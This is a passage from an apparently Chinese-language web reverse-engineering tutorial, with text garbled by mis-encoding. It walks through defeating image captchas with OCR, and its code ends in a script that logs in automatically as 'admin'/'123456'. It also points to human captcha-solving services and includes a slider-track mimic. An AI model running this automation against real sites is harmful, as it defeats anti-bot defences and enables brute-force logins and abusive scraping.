<li><a href="#section-28">API é€†å‘</a> - API é€†å‘å®Œæ•´æµç¨‹</li>
</ul>
<h3>é«˜çº§é…æ–¹</h3>
<ul>
<li><a href="#section-32">JavaScript åæ··æ·†</a> - å¤„ç†æ··æ·†ä»£ç </li>
<li><a href="#section-35">JSVMP</a> - å¤„ç†è™šæ‹Ÿæœºä¿æŠ¤</li>
</ul>
<h3>æ¡ˆä¾‹ç ”ç©¶</h3>
<ul>
<li><a href="#section-45">ç”µå•†ç½‘ç«™é€†å‘</a> - çœŸå®æ¡ˆä¾‹</li>
</ul>
<hr />
<h2>ğŸ‰ æ­å–œï¼</h2>
<p>ä½ å·²ç»æŒæ¡äº†ï¼š</p>
<ul>
<li>âœ… å®šä½åŠ å¯†å‡½æ•°çš„æ–¹æ³•</li>
<li>âœ… åˆ†æå¸¸è§åŠ å¯†ç®—æ³•</li>
<li>âœ… ç”¨ Python å¤ç°åŠ å¯†é€»è¾‘</li>
<li>âœ… æ„é€ æœ‰æ•ˆçš„ API è¯·æ±‚</li>
</ul>
<p><strong>ä¸‹ä¸€æ­¥</strong>:</p>
<ul>
<li>å­¦ä¹  <a href="#section-4">ç»•è¿‡ç®€å•éªŒè¯ç </a></li>
<li>æˆ–æ·±å…¥ <a href="#section-28">API é€†å‘</a></li>
</ul>
<hr />
<p><strong>å°è´´å£«</strong>:</p>
<ul>
<li>æ€»æ˜¯å…ˆåœ¨æµè§ˆå™¨ Console ä¸­éªŒè¯ä½ çš„ç†è§£</li>
<li>è®°å½•ä½ åˆ†æè¿‡çš„åŠ å¯†ç®—æ³•ï¼Œå»ºç«‹è‡ªå·±çš„çŸ¥è¯†åº“</li>
<li>é‡åˆ°ä¸æ‡‚çš„åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥æœç´¢æˆ–å‚è€ƒ <a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
</ul>
<p>Happy Decrypting! ğŸ”</p>

                                            </div>
                                            
                                            <div class="section" id="section-4">
                                                <h2>[R03] Bypass Simple CAPTCHA</h2>
                                                <h1>R03: é…æ–¹ï¼šç»•è¿‡ç®€å•éªŒè¯ç </h1>
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­â­ (åˆçº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>30-45 åˆ†é’Ÿ</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Python 3.7+, Tesseract OCR</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>è¯†åˆ«ç®€å•çš„å›¾å½¢éªŒè¯ç </td>
</tr>
<tr>
  <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
  <td>Python åŸºç¡€, PIL/Pillow åº“</td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ ä½ å°†å­¦åˆ°</h2>
<p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… åˆ†æéªŒè¯ç ç”Ÿæˆå’ŒéªŒè¯æµç¨‹</li>
<li>âœ… æŠ“å–éªŒè¯ç å›¾ç‰‡</li>
<li>âœ… ä½¿ç”¨ OCR æŠ€æœ¯è¯†åˆ«æ–‡å­—</li>
<li>âœ… å›¾åƒé¢„å¤„ç†æé«˜è¯†åˆ«ç‡</li>
<li>âœ… è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«æµç¨‹</li>
<li>âœ… åˆ¤æ–­ä½•æ—¶åº”è¯¥ä½¿ç”¨äººå·¥æ‰“ç å¹³å°</li>
</ul>
<hr />
<h2>ğŸ“ å‡†å¤‡å·¥ä½œ</h2>
<h3>å®‰è£…ä¾èµ–</h3>
<h4>1. å®‰è£… Python åº“</h4>
<pre><code class="language-bash">pip install pillow requests pytesseract opencv-python
</code></pre>
<h4>2. å®‰è£… Tesseract OCR</h4>
<p><strong>Windows</strong>:</p>
<pre><code class="language-bash"># ä¸‹è½½å®‰è£…åŒ…
https://github.com/UB-Mannheim/tesseract/wiki

# å®‰è£…åé…ç½®ç¯å¢ƒå˜é‡
set PATH=%PATH%;C:\Program Files\Tesseract-OCR
</code></pre>
<p><strong>macOS</strong>:</p>
<pre><code class="language-bash">brew install tesseract
</code></pre>
<p><strong>Linux</strong>:</p>
<pre><code class="language-bash">sudo apt-get install tesseract-ocr
sudo apt-get install libtesseract-dev
</code></pre>
<h4>3. éªŒè¯å®‰è£…</h4>
<pre><code class="language-bash">tesseract --version
# è¾“å‡º: tesseract 5.x.x
</code></pre>
<h3>æ£€æŸ¥æ¸…å•</h3>
<ul>
<li>â˜ å·²å®‰è£… Python 3.7+</li>
<li>â˜ å·²å®‰è£…æ‰€æœ‰ä¾èµ–åº“</li>
<li>â˜ Tesseract OCR æ­£å¸¸å·¥ä½œ</li>
<li>â˜ äº†è§£åŸºæœ¬çš„ Python å’Œ HTTP è¯·æ±‚</li>
</ul>
<hr />
<h2>ğŸš€ æ­¥éª¤è¯¦è§£</h2>
<h3>Step 1: åˆ†æéªŒè¯ç æµç¨‹</h3>
<h4>1.1 è§‚å¯ŸéªŒè¯ç </h4>
<p>æ‰“å¼€ä¸€ä¸ªæœ‰éªŒè¯ç çš„ç™»å½•é¡µé¢ï¼ˆæˆ–ä½¿ç”¨ä¸‹é¢çš„ç¤ºä¾‹ï¼‰ï¼š</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;éªŒè¯ç ç™»å½•&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h2&gt;ç™»å½•&lt;/h2&gt;
    &lt;input id=&quot;username&quot; placeholder=&quot;ç”¨æˆ·å&quot; /&gt;
    &lt;input id=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot; /&gt;
    &lt;br /&gt;&lt;br /&gt;
    &lt;img
      id=&quot;captcha&quot;
      src=&quot;/captcha&quot;
      onclick=&quot;this.src='/captcha?'+Date.now()&quot;
    /&gt;
    &lt;br /&gt;
    &lt;input id=&quot;captcha_code&quot; placeholder=&quot;éªŒè¯ç &quot; /&gt;
    &lt;button onclick=&quot;login()&quot;&gt;ç™»å½•&lt;/button&gt;

    &lt;script&gt;
      function login() {
        const data = {
          username: document.getElementById(&quot;username&quot;).value,
          password: document.getElementById(&quot;password&quot;).value,
          captcha: document.getElementById(&quot;captcha_code&quot;).value,
        };

        fetch(&quot;/api/login&quot;, {
          method: &quot;POST&quot;,
          headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
          body: JSON.stringify(data),
        })
          .then((r) =&gt; r.json())
          .then((result) =&gt; alert(result.message));
      }
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h4>1.2 ç†è§£éªŒè¯æµç¨‹</h4>
<ol>
<li><strong>è·å–éªŒè¯ç </strong>: <code>GET /captcha</code> â†’ è¿”å›å›¾ç‰‡</li>
<li><strong>ç”¨æˆ·è¾“å…¥</strong>: äººå·¥è¯†åˆ«å¹¶è¾“å…¥</li>
<li><strong>æäº¤éªŒè¯</strong>: <code>POST /api/login</code> å¸¦ä¸ŠéªŒè¯ç </li>
<li><strong>æœåŠ¡å™¨éªŒè¯</strong>: æ¯”å¯¹ç­”æ¡ˆï¼Œè¿”å›ç»“æœ</li>
</ol>
<p><strong>å…³é”®ç‚¹</strong>:</p>
<ul>
<li>éªŒè¯ç å›¾ç‰‡ URL: <code>/captcha</code></li>
<li>éªŒè¯ç éœ€è¦å’Œç™»å½•è¯·æ±‚ä¸€èµ·æäº¤</li>
<li>é€šå¸¸æœ‰ä¼šè¯ï¼ˆCookieï¼‰å…³è”éªŒè¯ç å’Œç­”æ¡ˆ</li>
</ul>
<hr />
<h3>Step 2: æŠ“å–éªŒè¯ç å›¾ç‰‡</h3>
<h4>2.1 ç¼–å†™æŠ“å–è„šæœ¬</h4>
<p>åˆ›å»º <code>captcha_download.py</code>:</p>
<pre><code class="language-python">import requests
from PIL import Image
from io import BytesIO

# åˆ›å»ºä¼šè¯ï¼ˆä¿æŒ Cookieï¼‰
session = requests.Session()

def download_captcha(url, save_path='captcha.png'):
    &quot;&quot;&quot;ä¸‹è½½éªŒè¯ç å›¾ç‰‡&quot;&quot;&quot;
    response = session.get(url)

    if response.status_code == 200:
        # ä¿å­˜å›¾ç‰‡
        with open(save_path, 'wb') as f:
            f.write(response.content)

        # æ˜¾ç¤ºå›¾ç‰‡
        img = Image.open(BytesIO(response.content))
        img.show()

        print(f&quot;âœ… éªŒè¯ç å·²ä¿å­˜åˆ°: {save_path}&quot;)
        return True
    else:
        print(f&quot;âŒ ä¸‹è½½å¤±è´¥: {response.status_code}&quot;)
        return False

if __name__ == '__main__':
    url = 'https://example.com/captcha'
    download_captcha(url)
</code></pre>
<h4>2.2 è¿è¡Œæµ‹è¯•</h4>
<pre><code class="language-bash">python captcha_download.py
</code></pre>
<p><strong>è¾“å‡º</strong>: å›¾ç‰‡ä¼šè‡ªåŠ¨æ‰“å¼€ï¼Œå¹¶ä¿å­˜ä¸º <code>captcha.png</code></p>
<hr />
<h3>Step 3: OCR è¯†åˆ«éªŒè¯ç </h3>
<h4>3.1 åŸºç¡€è¯†åˆ«</h4>
<p>åˆ›å»º <code>captcha_ocr.py</code>:</p>
<pre><code class="language-python">import pytesseract
from PIL import Image

def recognize_captcha(image_path):
    &quot;&quot;&quot;è¯†åˆ«éªŒè¯ç &quot;&quot;&quot;
    # åŠ è½½å›¾ç‰‡
    img = Image.open(image_path)

    # OCR è¯†åˆ«
    text = pytesseract.image_to_string(img, config='--psm 7 digits')

    # æ¸…ç†ç»“æœï¼ˆå»é™¤ç©ºæ ¼å’Œæ¢è¡Œï¼‰
    result = text.strip().replace(' ', '').replace('\n', '')

    print(f&quot;è¯†åˆ«ç»“æœ: {result}&quot;)
    return result

if __name__ == '__main__':
    result = recognize_captcha('captcha.png')
    print(f&quot;âœ… éªŒè¯ç æ˜¯: {result}&quot;)
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>:</p>
<ul>
<li><code>--psm 7</code>: Page Segmentation Mode = 7ï¼ˆå•è¡Œæ–‡æœ¬ï¼‰</li>
<li><code>digits</code>: åªè¯†åˆ«æ•°å­—</li>
</ul>
<h4>3.2 æµ‹è¯•è¯†åˆ«</h4>
<pre><code class="language-bash">python captcha_ocr.py
</code></pre>
<p><strong>å¯èƒ½çš„é—®é¢˜</strong>: è¯†åˆ«ç‡å¾ˆä½æˆ–å®Œå…¨è¯†åˆ«ä¸å‡ºæ¥</p>
<p><strong>åŸå› </strong>: éªŒè¯ç æœ‰å¹²æ‰°ï¼ˆå™ªç‚¹ã€çº¿æ¡ã€å€¾æ–œç­‰ï¼‰</p>
<hr />
<h3>Step 4: å›¾åƒé¢„å¤„ç†</h3>
<h4>4.1 å¢å¼ºè¯†åˆ«ç‡</h4>
<p>åˆ›å»º <code>captcha_preprocess.py</code>:</p>
<pre><code class="language-python">import cv2
import numpy as np
from PIL import Image
import pytesseract

def preprocess_image(image_path):
    &quot;&quot;&quot;é¢„å¤„ç†éªŒè¯ç å›¾ç‰‡&quot;&quot;&quot;
    # è¯»å–å›¾ç‰‡
    img = cv2.imread(image_path)

    # 1. è½¬ç°åº¦
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

    # 2. äºŒå€¼åŒ–ï¼ˆå»é™¤å™ªç‚¹ï¼‰
    _, binary = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

    # 3. å»å™ªï¼ˆå½¢æ€å­¦æ“ä½œï¼‰
    kernel = np.ones((2, 2), np.uint8)
    opening = cv2.morphologyEx(binary, cv2.MORPH_OPEN, kernel, iterations=1)

    # 4. ä¿å­˜å¤„ç†åçš„å›¾ç‰‡
    processed_path = 'captcha_processed.png'
    cv2.imwrite(processed_path, opening)

    print(f&quot;âœ… é¢„å¤„ç†å®Œæˆ: {processed_path}&quot;)
    return processed_path

def recognize_with_preprocess(image_path):
    &quot;&quot;&quot;é¢„å¤„ç†åè¯†åˆ«&quot;&quot;&quot;
    # é¢„å¤„ç†
    processed_path = preprocess_image(image_path)

    # OCR è¯†åˆ«
    img = Image.open(processed_path)
    text = pytesseract.image_to_string(img, config='--psm 7 digits')
    result = text.strip().replace(' ', '').replace('\n', '')

    print(f&quot;è¯†åˆ«ç»“æœ: {result}&quot;)
    return result

if __name__ == '__main__':
    result = recognize_with_preprocess('captcha.png')
    print(f&quot;âœ… éªŒè¯ç æ˜¯: {result}&quot;)
</code></pre>
<h4>4.2 å¯¹æ¯”æ•ˆæœ</h4>
<pre><code class="language-bash"># åŸå§‹è¯†åˆ«
python captcha_ocr.py
# è¾“å‡º: 12O4 (é”™è¯¯)

# é¢„å¤„ç†åè¯†åˆ«
python captcha_preprocess.py
# è¾“å‡º: 1234 (æ­£ç¡®)
</code></pre>
<hr />
<h3>Step 5: å®Œæ•´è‡ªåŠ¨åŒ–æµç¨‹</h3>
<h4>5.1 é›†æˆæ‰€æœ‰æ­¥éª¤</h4>
<p>åˆ›å»º <code>auto_login.py</code>:</p>
<pre><code class="language-python">import requests
import pytesseract
from PIL import Image
from io import BytesIO
import cv2
import numpy as np

class CaptchaBypass:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def download_captcha(self):
        &quot;&quot;&quot;ä¸‹è½½éªŒè¯ç &quot;&quot;&quot;
        url = f&quot;{self.base_url}/captcha&quot;
        response = self.session.get(url)

        if response.status_code == 200:
            return response.content
        return None

    def preprocess_image(self, image_bytes):
        &quot;&quot;&quot;é¢„å¤„ç†å›¾ç‰‡&quot;&quot;&quot;
        # å­—èŠ‚ â†’ numpy array
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

        # ç°åº¦åŒ–
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)

        # äºŒå€¼åŒ–
        _, binary = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)

        # å»å™ª
        kernel = np.ones((2, 2), np.uint8)
        opening = cv2.morphologyEx(binary, cv2.MORPH_OPEN, kernel, iterations=1)

        # numpy array â†’ PIL Image
        img_pil = Image.fromarray(opening)
        return img_pil

    def recognize_captcha(self, img):
        &quot;&quot;&quot;OCR è¯†åˆ«&quot;&quot;&quot;
        text = pytesseract.image_to_string(img, config='--psm 7 digits')
        result = text.strip().replace(' ', '').replace('\n', '')
        return result

    def login(self, username, password):
        &quot;&quot;&quot;è‡ªåŠ¨ç™»å½•&quot;&quot;&quot;
        # 1. ä¸‹è½½éªŒè¯ç 
        print(&quot;ğŸ“¥ ä¸‹è½½éªŒè¯ç ...&quot;)
        captcha_bytes = self.download_captcha()

        # 2. é¢„å¤„ç†
        print(&quot;ğŸ”§ é¢„å¤„ç†å›¾ç‰‡...&quot;)
        processed_img = self.preprocess_image(captcha_bytes)

        # 3. è¯†åˆ«
        print(&quot;ğŸ” è¯†åˆ«éªŒè¯ç ...&quot;)
        captcha_code = self.recognize_captcha(processed_img)
        print(f&quot;âœ… è¯†åˆ«ç»“æœ: {captcha_code}&quot;)

        # 4. ç™»å½•
        print(&quot;ğŸš€ å‘é€ç™»å½•è¯·æ±‚...&quot;)
        response = self.session.post(
            f&quot;{self.base_url}/api/login&quot;,
            json={
                'username': username,
                'password': password,
                'captcha': captcha_code
            }
        )

        result = response.json()
        print(f&quot;ğŸ“¥ å“åº”: {result}&quot;)

        return result

if __name__ == '__main__':
    bypass = CaptchaBypass('https://example.com')
    result = bypass.login('admin', '123456')

    if result['code'] == 0:
        print(&quot;ğŸ‰ ç™»å½•æˆåŠŸï¼&quot;)
    else:
        print(f&quot;âŒ ç™»å½•å¤±è´¥: {result['message']}&quot;)
</code></pre>
<h4>5.2 è¿è¡Œæµ‹è¯•</h4>
<pre><code class="language-bash">python auto_login.py
</code></pre>
<p><strong>é¢„æœŸè¾“å‡º</strong>:</p>
<pre><code>ğŸ“¥ ä¸‹è½½éªŒè¯ç ...
ğŸ”§ é¢„å¤„ç†å›¾ç‰‡...
ğŸ” è¯†åˆ«éªŒè¯ç ...
âœ… è¯†åˆ«ç»“æœ: 1234
ğŸš€ å‘é€ç™»å½•è¯·æ±‚...
ğŸ“¥ å“åº”: {'code': 0, 'message': 'ç™»å½•æˆåŠŸ', 'token': '...'}
ğŸ‰ ç™»å½•æˆåŠŸï¼
</code></pre>
<hr />
<h2>âœ… éªŒè¯æ¸…å•</h2>
<p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>
<ul>
<li>â˜ æˆåŠŸä¸‹è½½éªŒè¯ç å›¾ç‰‡</li>
<li>â˜ Tesseract OCR èƒ½æ­£å¸¸è¯†åˆ«</li>
<li>â˜ é¢„å¤„ç†æé«˜äº†è¯†åˆ«ç‡</li>
<li>â˜ å®Œæ•´çš„è‡ªåŠ¨åŒ–æµç¨‹èƒ½è¿è¡Œ</li>
<li>â˜ è¯†åˆ«å‡†ç¡®ç‡è¾¾åˆ° 60% ä»¥ä¸Š</li>
</ul>
<hr />
<h2>ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>
<h3>ç»ƒä¹  1: æé«˜è¯†åˆ«ç‡</h3>
<p>å°è¯•ä¸åŒçš„é¢„å¤„ç†æ–¹æ³•ï¼š</p>
<pre><code class="language-python"># æ–¹æ³•1: è°ƒæ•´äºŒå€¼åŒ–é˜ˆå€¼
_, binary = cv2.threshold(gray, 150, 255, cv2.THRESH_BINARY)

# æ–¹æ³•2: è†¨èƒ€å’Œè…èš€
dilate = cv2.dilate(binary, kernel, iterations=1)
erode = cv2.erode(dilate, kernel, iterations=1)

# æ–¹æ³•3: å»é™¤è¾¹æ¡†
h, w = gray.shape
gray = gray[5:h-5, 5:w-5]
</code></pre>
<h3>ç»ƒä¹  2: å¤„ç†å­—æ¯éªŒè¯ç </h3>
<p>ä¿®æ”¹ OCR é…ç½®ï¼š</p>
<pre><code class="language-python"># è¯†åˆ«å­—æ¯+æ•°å­—
text = pytesseract.image_to_string(img, config='--psm 7')

# åªè¯†åˆ«å¤§å†™å­—æ¯+æ•°å­—
text = pytesseract.image_to_string(img, config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
</code></pre>
<h3>ç»ƒä¹  3: ä½¿ç”¨æœºå™¨å­¦ä¹ </h3>
<p>å¯¹äºå¤æ‚éªŒè¯ç ï¼Œå¯ä»¥ä½¿ç”¨æ·±åº¦å­¦ä¹ ï¼š</p>
<pre><code class="language-python"># ä½¿ç”¨ CRNN æ¨¡å‹
import torch
from crnn import CRNN

model = CRNN()
model.load_state_dict(torch.load('captcha_model.pth'))
result = model.predict(img)
</code></pre>
<p><strong>è®­ç»ƒæ•°æ®</strong>: éœ€è¦æ ‡æ³¨ 1000+éªŒè¯ç æ ·æœ¬</p>
<hr />
<h2>â— å¸¸è§é—®é¢˜</h2>
<h3>Q1: OCR å®Œå…¨è¯†åˆ«ä¸å‡ºæ¥æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>A</strong>: å¯èƒ½çš„åŸå› å’Œè§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li><p><strong>å¹²æ‰°å¤ªå¼º</strong>:</p>
<ul>
<li>å°è¯•æ›´æ¿€è¿›çš„é¢„å¤„ç†</li>
<li>ä½¿ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹</li>
<li>è€ƒè™‘ä½¿ç”¨æ‰“ç å¹³å°</li>
</ul>
</li>
<li><p><strong>å­—ä½“ç‰¹æ®Š</strong>:</p>
<ul>
<li>è®­ç»ƒ Tesseract è‡ªå®šä¹‰å­—ä½“</li>
<li>ä½¿ç”¨æ·±åº¦å­¦ä¹ æ¨¡å‹</li>
</ul>
</li>
<li><p><strong>éªŒè¯ç ç±»å‹ä¸é€‚åˆ OCR</strong>:</p>
<ul>
<li>æ»‘å—éªŒè¯ç  â†’ ä½¿ç”¨è½¨è¿¹æ¨¡æ‹Ÿ</li>
<li>ç‚¹é€‰éªŒè¯ç  â†’ ä½¿ç”¨å›¾åƒè¯†åˆ«</li>
<li>è¡Œä¸ºéªŒè¯ç  â†’ åˆ†æè¡Œä¸ºæ¨¡å¼</li>
</ul>
</li>
</ol>
<h3>Q2: è¯†åˆ«ç‡åªæœ‰ 30%ï¼Œå¦‚ä½•æé«˜ï¼Ÿ</h3>
<p><strong>A</strong>: æŒ‰é¡ºåºå°è¯•ï¼š</p>
<ol>
<li><strong>ä¼˜åŒ–é¢„å¤„ç†</strong> (å¯æå‡åˆ° 60%)</li>
<li><strong>è°ƒæ•´ OCR å‚æ•°</strong> (å¯æå‡åˆ° 70%)</li>
<li><strong>å¤šæ¬¡è¯†åˆ«å–æœ€å¯èƒ½ç»“æœ</strong> (å¯æå‡åˆ° 80%)</li>
<li><strong>è®­ç»ƒè‡ªå®šä¹‰æ¨¡å‹</strong> (å¯æå‡åˆ° 90%+)</li>
</ol>
<p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>
<pre><code class="language-python"># å¤šæ¬¡è¯†åˆ«
results = []
for i in range(5):
    result = recognize_captcha(img)
    results.append(result)

# å–å‡ºç°æœ€å¤šçš„ç»“æœ
from collections import Counter
most_common = Counter(results).most_common(1)[0][0]
</code></pre>
<h3>Q3: ä½•æ—¶åº”è¯¥ä½¿ç”¨æ‰“ç å¹³å°ï¼Ÿ</h3>
<p><strong>A</strong>: ä»¥ä¸‹æƒ…å†µå»ºè®®ä½¿ç”¨æ‰“ç å¹³å°ï¼š</p>
<ul>
<li>éªŒè¯ç éå¸¸å¤æ‚ï¼ˆæ‰­æ›²ã€é‡å ã€èƒŒæ™¯å¤æ‚ï¼‰</li>
<li>è¯†åˆ«ç‡ä½äº 60%ä¸”ä¼˜åŒ–æ— æ•ˆ</li>
<li>éªŒè¯ç ç±»å‹å¤šå˜</li>
<li>é¡¹ç›®é¢„ç®—å……è¶³</li>
</ul>
<p><strong>æ¨èå¹³å°</strong>:</p>
<ul>
<li>è¶…çº§é¹°: <a href="http://www.chaojiying.com/">http://www.chaojiying.com/</a></li>
<li>æ‰“ç å…”: <a href="http://www.dama2.com/">http://www.dama2.com/</a></li>
</ul>
<p><strong>æˆæœ¬</strong>: çº¦ Â¥0.001 - Â¥0.01 / å¼ </p>
<h3>Q4: å¦‚ä½•å¤„ç†æ»‘å—éªŒè¯ç ï¼Ÿ</h3>
<p><strong>A</strong>: æ»‘å—éªŒè¯ç ä¸é€‚åˆ OCRï¼Œéœ€è¦ï¼š</p>
<ol>
<li><p><strong>æ¨¡æ‹Ÿæ»‘åŠ¨è½¨è¿¹</strong>:</p>
<pre><code class="language-python"># ç”Ÿæˆæ¨¡æ‹Ÿäººç±»çš„è½¨è¿¹
def generate_track(distance):
    track = []
    current = 0
    while current &lt; distance:
        v = random.randint(1, 5)
        track.append(v)
        current += v
    return track
</code></pre>
</li>
<li><p><strong>åˆ†æç¼ºå£ä½ç½®</strong>:</p>
<ul>
<li>ä½¿ç”¨å›¾åƒè¯†åˆ«æ‰¾åˆ°ç¼ºå£</li>
<li>è®¡ç®—éœ€è¦ç§»åŠ¨çš„è·ç¦»</li>
</ul>
</li>
</ol>
<p>å‚è€ƒ: <a href="#section-33">éªŒè¯ç ç»•è¿‡</a></p>
<hr />
<h2>ğŸ” åŸç†è§£æ</h2>
<h3>OCR å·¥ä½œåŸç†</h3>
<pre><code>å›¾ç‰‡ â†’ é¢„å¤„ç† â†’ ç‰¹å¾æå– â†’ å­—ç¬¦åˆ†ç±» â†’ æ–‡æœ¬è¾“å‡º
</code></pre>
<p><strong>å…³é”®æ­¥éª¤</strong>:</p>
<ol>
<li><strong>äºŒå€¼åŒ–</strong>: è½¬ä¸ºé»‘ç™½å›¾ç‰‡ï¼Œçªå‡ºæ–‡å­—</li>
<li><strong>å»å™ª</strong>: ç§»é™¤å¹²æ‰°ç‚¹å’Œçº¿æ¡</li>
<li><strong>åˆ†å‰²</strong>: å°†å­—ç¬¦åˆ†å‰²ä¸ºç‹¬ç«‹çš„éƒ¨åˆ†</li>
<li><strong>è¯†åˆ«</strong>: å°†æ¯ä¸ªå­—ç¬¦ä¸å­—åº“å¯¹æ¯”</li>
</ol>
<h3>ä¸ºä»€ä¹ˆéœ€è¦é¢„å¤„ç†ï¼Ÿ</h3>
<p>åŸå§‹éªŒè¯ç çš„å¹²æ‰°ï¼š</p>
<ul>
<li>å™ªç‚¹ï¼ˆéšæœºç‚¹ï¼‰</li>
<li>å¹²æ‰°çº¿ï¼ˆéšæœºçº¿æ¡ï¼‰</li>
<li>é¢œè‰²å˜åŒ–</li>
<li>å­—ç¬¦ç²˜è¿æˆ–æ–­è£‚</li>
</ul>
<p>é¢„å¤„ç†å¯ä»¥ï¼š</p>
<ul>
<li>å»é™¤å™ªç‚¹å’Œçº¿æ¡</li>
<li>ç»Ÿä¸€é¢œè‰²ï¼ˆé»‘ç™½ï¼‰</li>
<li>ä¿®å¤æ–­è£‚</li>
<li>åˆ†ç¦»ç²˜è¿</li>
</ul>
<hr />
<h2>ğŸ“š ç›¸å…³é…æ–¹</h2>
<h3>åŸºç¡€é…æ–¹</h3>
<ul>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§</a> - è°ƒè¯•éªŒè¯æµç¨‹</li>
</ul>
<h3>é«˜çº§é…æ–¹</h3>
<ul>
<li><a href="#section-33">éªŒè¯ç è¯†åˆ«ä¸ç»•è¿‡</a> - æ›´å¤šéªŒè¯ç ç±»å‹</li>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹</a> - è¡Œä¸ºéªŒè¯ç </li>
</ul>
<h3>å·¥å…·è„šæœ¬</h3>
<ul>
<li><a href="#section-60">è‡ªåŠ¨åŒ–è„šæœ¬</a> - Selenium è‡ªåŠ¨åŒ–</li>
</ul>
<hr />
<h2>ğŸ‰ æ­å–œï¼</h2>
<p>ä½ å·²ç»æŒæ¡äº†ï¼š</p>
<ul>
<li>âœ… éªŒè¯ç æµç¨‹åˆ†æ</li>
<li>âœ… OCR åŸºç¡€ä½¿ç”¨</li>
<li>âœ… å›¾åƒé¢„å¤„ç†æŠ€å·§</li>
<li>âœ… è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«</li>
</ul>
<p><strong>ä¸‹ä¸€æ­¥</strong>:</p>
<ul>
<li>æ·±å…¥å­¦ä¹  <a href="#section-33">éªŒè¯ç ç»•è¿‡</a></li>
<li>æˆ–å¼€å§‹ <a href="../../03-Basic-Recipes/">åŸºç¡€é…æ–¹</a> çš„ç³»ç»Ÿå­¦ä¹ </li>
</ul>
<hr />
<p><strong>å°è´´å£«</strong>:</p>
<ul>
<li>OCR ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå¤æ‚éªŒè¯ç éœ€è¦æœºå™¨å­¦ä¹ </li>
<li>éµå®ˆç½‘ç«™çš„æœåŠ¡æ¡æ¬¾å’Œè¯·æ±‚é¢‘ç‡é™åˆ¶</li>
<li>åˆæ³•åˆè§„ä½¿ç”¨è¿™äº›æŠ€æœ¯</li>
</ul>
<p>Happy Bypassing! ğŸ¤–</p>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part II: Kitchen Basics</h1>
                    
                                            <div class="section" id="section-5">
                                                <h2>[R04] HTTP/HTTPS Protocol</h2>
                                                <h1>R04: HTTP/HTTPS åè®®</h1>
<h2>æ¦‚è¿°</h2>
<p>HTTP (HyperText Transfer Protocol) å’Œ HTTPS (HTTP Secure) æ˜¯ Web é€šä¿¡çš„åŸºç¡€åè®®ã€‚ç†è§£è¿™äº›åè®®å¯¹äº Web é€†å‘å·¥ç¨‹è‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>HTTP åŸºç¡€</h2>
<h3>è¯·æ±‚æ–¹æ³•</h3>
<p>å¸¸è§çš„ HTTP æ–¹æ³•ï¼š</p>
<ul>
<li><strong>GET</strong>: è¯·æ±‚æŒ‡å®šçš„èµ„æºï¼Œå‚æ•°åœ¨ URL ä¸­</li>
<li><strong>POST</strong>: å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼Œå‚æ•°åœ¨è¯·æ±‚ä½“ä¸­</li>
<li><strong>PUT</strong>: æ›´æ–°èµ„æº</li>
<li><strong>DELETE</strong>: åˆ é™¤èµ„æº</li>
<li><strong>HEAD</strong>: ç±»ä¼¼ GETï¼Œä½†åªè¿”å›å¤´éƒ¨</li>
<li><strong>OPTIONS</strong>: è·å–æœåŠ¡å™¨æ”¯æŒçš„æ–¹æ³•</li>
<li><strong>PATCH</strong>: éƒ¨åˆ†æ›´æ–°èµ„æº</li>
</ul>
<h3>è¯·æ±‚ç»“æ„</h3>
<pre><code class="language-http">GET /api/users?id=123 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: application/json
Cookie: session_id=abc123
</code></pre>
<p><strong>ç»„æˆéƒ¨åˆ†</strong>ï¼š</p>
<ol>
<li>è¯·æ±‚è¡Œï¼šæ–¹æ³• + è·¯å¾„ + åè®®ç‰ˆæœ¬</li>
<li>è¯·æ±‚å¤´ï¼šKey-Value é”®å€¼å¯¹</li>
<li>ç©ºè¡Œ</li>
<li>è¯·æ±‚ä½“ï¼ˆå¯é€‰ï¼‰</li>
</ol>
<h3>å“åº”ç»“æ„</h3>
